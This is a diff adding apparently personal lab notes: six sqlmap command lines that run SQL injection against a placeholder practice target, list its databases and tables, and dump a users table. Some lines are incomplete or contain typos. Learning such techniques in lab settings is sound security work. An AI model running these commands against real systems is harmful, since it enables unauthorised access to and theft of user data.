@@ -1,0 +1,6 @@
+- sqlmap -v -u 'https://TARGET.NET/search?term=x&organizeby=DATE&journalist=&cachebust=1656138093.57' -p "term" --batch --cookie="_lab=YESYESYESYES; session=YESYESYESYES" --random-agent --level=2 --risk=2
+- SQLMAP DBS to get databases: sqlmap -p 'sort-by' -batch --dbms postgresql --technique E --level 5 --dbs
+- Use SQLMAP dump tables identified from public database: -p 'sort-by' -batch --dbms postgresql --technique E --level 5 -D public --tables
+- ContinueUse SQLMAP E Technique to get the users content: -p 'sort-by' -batch --dbms postgresql --technique E --level 5 -D public -T users --dump
+- Sqlmap -u "https://" –cookie="" -dbs –level 5 –risk 3 
+- python sqlmap.py -r "C:\Users\naisa\Desktop\Learning\BurpMysteryLab" -D public -T users --dump –threads=10 -batch
